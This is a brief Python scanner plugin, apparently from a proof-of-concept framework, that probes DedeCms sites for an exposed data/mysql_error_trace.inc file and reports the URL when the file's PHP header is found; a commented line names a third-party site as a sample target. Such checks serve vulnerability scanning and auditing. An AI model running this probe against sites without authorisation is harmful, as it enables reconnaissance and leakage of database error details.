#!/usr/bin/env python
# -*- coding: utf-8 -*-
# DedeCms data/mysql_error_trace.inc 敏感信息泄露
import requests

def audit(arg):
    url = arg + '/data/mysql_error_trace.inc'
    req = requests.get(url, timeout=5)
    if "<?php  exit();" in req.text:
        return url

class Exploit(object):

    def attack(self, url):
        return audit(url)

# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('dedecms', 'http://www.9ifd.com/')[1])
